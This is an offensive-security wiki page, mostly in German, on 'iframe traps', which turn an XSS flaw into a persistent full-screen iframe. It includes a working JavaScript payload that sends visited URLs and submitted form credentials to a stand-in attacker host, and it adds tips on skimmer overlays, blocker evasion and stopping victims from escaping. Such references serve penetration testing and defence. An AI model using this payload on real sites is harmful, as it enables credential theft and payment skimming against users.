# Iframe Traps

{{#include ../banners/hacktricks-training.md}}

## Basic Information

Diese Form, XSS über iframes auszunutzen, um Informationen vom Benutzer zu stehlen, während er sich auf der Webseite bewegt, wurde ursprünglich in diesen zwei Beiträgen von trustedsec.com veröffentlicht: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **und** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

Der Angriff beginnt auf einer Seite, die für XSS verwundbar ist, bei der es möglich ist, dafür zu sorgen, dass die Opfer die XSS-Seite nicht verlassen, indem man sie innerhalb eines iframe navigieren lässt, das die gesamte Webanwendung einnimmt.

Der XSS-Angriff lädt im Grunde die Webseite in ein iframe, das 100% des Bildschirms einnimmt. Daher wird das Opfer **won't notice he is inside an iframe**. Wenn das Opfer dann auf Links innerhalb des iframe (innerhalb der Webanwendung) klickt und sich auf der Seite bewegt, wird es **navigating inside the iframe** und das eingebettete beliebige JS stiehlt Informationen aus dieser Navigation.

Außerdem kann man, um es realistischer erscheinen zu lassen, einige **listeners** verwenden, um zu prüfen, wann ein iframe die Location der Seite ändert, und die URL des Browsers mit diesen Locations zu aktualisieren, sodass der Benutzer denkt, er bewege sich mit dem Browser zwischen Seiten.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

Außerdem lassen sich mit listeners nicht nur die anderen Seiten, die das Opfer besucht, auslesen, sondern auch die Daten aus **filled forms** erfassen und absenden (Credentials?), oder **steal the local storage**...

Natürlich sind die Hauptbeschränkungen, dass ein **victim closing the tab or putting another URL in the browser will escape the iframe**. Ein weiterer Weg, dem zu entkommen, wäre die **refresh the page**, dies könnte jedoch teilweise **prevented** werden, indem bei jedem Laden einer neuen Seite im iframe das Rechtsklick-Kontextmenü deaktiviert wird oder bemerkt wird, wenn die Maus des Nutzers das iframe verlässt, möglicherweise um auf den Reload-Button des Browsers zu klicken — in diesem Fall wird die URL des Browsers wieder auf die ursprüngliche, für XSS verwundbare URL gesetzt, sodass bei einem Reload die Seite erneut kompromittiert wird (beachte, dass das nicht sehr stealth ist).

## Modernised trap (2024+)

* Verwende ein **full‑viewport iframe** plus History/Navigation API, um echte Navigation zu simulieren.

<details>
<summary>Full-viewport iframe trap</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) hält die äußere URL‑Leiste synchron, ohne die echte URL zu leak.
* Gehe in **fullscreen**, um die Browser‑UI zu verbergen und eine eigene gefälschte Adressleiste/Schlosssymbol zu zeichnen.

## Overlay & skimmer Verwendung

* Kompromittierte Händler ersetzen gehostete payment iframes (Stripe, Adyen, etc.) durch ein **pixel‑perfect overlay**, das Tastenanschläge weiterleitet, während das echte Frame darunter bleibt. Manchmal werden legacy validation APIs verwendet, damit der Ablauf nie unterbrochen wird.
* Das Einsperren von Nutzern im Top‑Frame erfasst **autofill/password‑manager**‑Daten, bevor sie bemerken, dass sich die URL‑Leiste nie geändert hat.

## Evasion tricks observed in 2025 research

* `about:blank`/`data:` local frames erben die Parent‑Origin und umgehen einige Content‑Blocker‑Heuristiken; verschachtelte iframes können nachgeladen werden, selbst wenn Extensions Third‑party‑Frames entfernen.
* **Permission propagation**: Durch Umschreiben des Parent‑`allow`‑Attributs erhalten verschachtelte Angreifer‑Frames fullscreen/camera/microphone ohne offensichtliche DOM‑Änderungen.

## Schnelle OPSEC‑Tipps

* Fokussiere das iframe neu, wenn die Maus die Seite verlässt (`mouseleave` auf body), um zu verhindern, dass Nutzer die Browser‑UI erreichen.
* Deaktiviere Kontextmenü und gängige Shortcuts (`keydown` für `F11`, `Ctrl+L`, `Ctrl+T`) innerhalb des Frames, um Fluchtversuche zu verlangsamen.
* Wenn CSP Inline‑Skripte blockiert, injiziere einen remote Bootstrapper und aktiviere `srcdoc` am iframe, sodass dein Payload außerhalb der durchgesetzten CSP der Hauptseite lebt.

## Related

{{#ref}}
clickjacking.md
{{#endref}}



## References

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
